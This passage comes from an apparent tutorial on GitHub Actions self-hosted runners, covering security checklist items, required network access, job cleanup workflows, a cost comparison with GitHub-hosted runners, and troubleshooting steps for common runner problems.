│   ├── ✅ Monitor runner logs for suspicious activity
│   ├── ✅ Alert on unexpected processes
│   ├── ✅ Track resource usage (CPU, memory, disk)
│   ├── ✅ Audit who has access to runner settings
│   └── ✅ Set up alerts for offline runners
│
└── DOCKER (if using)
    ├── ✅ Don't run containers as root
    ├── ✅ Use rootless Docker if possible
    ├── ✅ Limit Docker socket access
    └── ✅ Scan container images for vulnerabilities
```

### Required Network Access:

```
Your self-hosted runner needs outbound HTTPS (port 443) access to:

Required:
├── github.com
├── api.github.com
├── *.actions.githubusercontent.com
├── ghcr.io                          (GitHub Container Registry)
├── *.blob.core.windows.net          (Artifact storage)
└── *.pkg.github.com                 (GitHub Packages)

Optional (depending on your workflows):
├── registry.npmjs.org               (npm packages)
├── pypi.org                         (Python packages)
├── hub.docker.com                   (Docker images)
├── *.amazonaws.com                  (AWS services)
└── Whatever your workflows need
```

### Cleaning Up After Jobs:

Even with non-ephemeral runners, you should clean up after each job:

```yaml
jobs:
  build:
    runs-on: [self-hosted, linux]
    steps:
      - uses: actions/checkout@v4
        with:
          clean: true    # Clean the repo directory before checkout

      - run: npm ci && npm test

      # Always clean up at the end (even if job fails)
      - name: Cleanup
        if: always()
        run: |
          # Remove build artifacts
          rm -rf node_modules dist build

          # Clean Docker
          docker system prune -f 2>/dev/null || true

          # Remove any temporary files
          rm -rf /tmp/runner-* 2>/dev/null || true

          # Remove any credentials
          rm -f ~/.npmrc ~/.docker/config.json 2>/dev/null || true
```

## 19. Cost Comparison — GitHub-Hosted vs Self-Hosted

Let's do the math to see when self-hosted runners make financial sense.

### GitHub-Hosted Pricing (as of 2024):

```
Free Tier (all plans):
├── Public repos:  Unlimited minutes (free!)
└── Private repos:
    ├── Free plan:   2,000 min/month
    ├── Team plan:   3,000 min/month
    └── Enterprise:  50,000 min/month

Overage Rates (per minute):
├── Linux:    $0.008/min
├── Windows:  $0.016/min (2x Linux)
└── macOS:    $0.080/min (10x Linux!)

Larger Runners (per minute):
├── 4-core:   $0.032/min
├── 8-core:   $0.064/min
├── 16-core:  $0.128/min
├── 32-core:  $0.256/min
└── 64-core:  $0.512/min
```

### Cost Comparison Example:

```
Scenario: Team running 100 builds/day, 15 min each, on Linux

GitHub-Hosted:
├── 100 builds × 15 min = 1,500 min/day
├── 1,500 × 30 days = 45,000 min/month
├── 45,000 - 3,000 (Team free) = 42,000 overage minutes
├── 42,000 × $0.008 = $336/month
└── Annual: $4,032/year

Self-Hosted (AWS EC2):
├── 2× t3.xlarge instances (4 vCPU, 16 GB)
├── On-demand: $0.1664/hr × 24 × 30 = $239.80/instance/month
├── Total: $479.60/month
├── With Reserved (1-year): ~$300/month
├── With Spot: ~$100-150/month
└── Annual (spot): ~$1,200-1,800/year

💰 Savings with self-hosted (spot): $2,200-2,800/year
```

### Break-Even Analysis:

```
Self-hosted is cheaper when:
├── You use > 5,000 GitHub-hosted minutes/month
├── You need macOS runners (10x cost!)
├── You need large runners (4+ cores)
├── You have many builds per day
└── You can use spot/preemptible instances

GitHub-hosted is cheaper when:
├── You use < 3,000 minutes/month
├── You don't want to manage infrastructure
├── You need diverse OS/architecture matrix
├── Your usage is spiky (pay only when used)
└── Your team is small
```

## 21. Common Mistakes & Troubleshooting

### Mistake 1: Runner Shows "Offline"

```
Possible causes:
├── Runner service is not running
│   Fix: sudo systemctl restart actions.runner.*
│
├── Network connectivity issue
│   Fix: curl -sf https://api.github.com && echo "OK"
│
├── Runner token has expired
│   Fix: Re-register with a new token
│
├── Runner version is too old
│   Fix: Download and install the latest version
│
└── DNS resolution failure
    Fix: nslookup github.com
```

### Mistake 2: Job Queued Forever (No Runner Available)

```
Possible causes:
├── No runner matches the labels in runs-on
│   Fix: Check labels — runs-on: [self-hosted, linux] must match runner labels
│
├── All matching runners are busy
│   Fix: Add more runners or wait
│
├── Runner group doesn't allow this repository
│   Fix: Update runner group settings
│
└── Runner is offline
    Fix: Check runner status and restart if needed
```

### Mistake 3: "Permission Denied" Errors

```bash
# Docker permission denied
docker: Got permission denied while trying to connect to the Docker daemon socket

# Fix: Add the runner user to the docker group
sudo usermod -aG docker runner
sudo systemctl restart actions.runner.*
# OR restart the runner after adding to group
```

### Mistake 4: Disk Space Full

```bash
# Runner work directories can grow quickly
du -sh ~/actions-runner/_work/

# Clean up old work directories
cd ~/actions-runner
./bin/Runner.Listener --cleanworkdir

# Clean Docker
docker system prune -af --volumes

# Set up automatic cleanup (cron job)
echo "0 2 * * * find /home/runner/actions-runner/_work -maxdepth 1 -mtime +3 -exec rm -rf {} \;" | crontab -
```

### Mistake 5: Environment Variables Not Available

```yaml
# Self-hosted runners don't have the same pre-installed env vars
# as GitHub-hosted runners!

# GitHub-hosted has: RUNNER_TOOL_CACHE, ANDROID_HOME, JAVA_HOME, etc.
# Self-hosted: You need to install and configure everything yourself!

# Fix: Install tools and set env vars in your runner setup script
# Or install them in your workflow:
steps:
  - uses: actions/setup-node@v4    # This works on self-hosted too!
    with:
      node-version: '20'
```

### Mistake 6: Runner Updates

```bash
# GitHub may require runners to be updated
# Check for updates:
cat ~/actions-runner/.runner | jq '.agentVersion'

# The runner auto-updates by default, but if it fails:
cd ~/actions-runner
sudo ./svc.sh stop

# Download the latest version
LATEST=$(curl -s https://api.github.com/repos/actions/runner/releases/latest | jq -r '.tag_name' | sed 's/v//')
curl -sL -o runner.tar.gz "https://github.com/actions/runner/releases/download/v${LATEST}/actions-runner-linux-x64-${LATEST}.tar.gz"
tar xzf runner.tar.gz

sudo ./svc.sh start
```
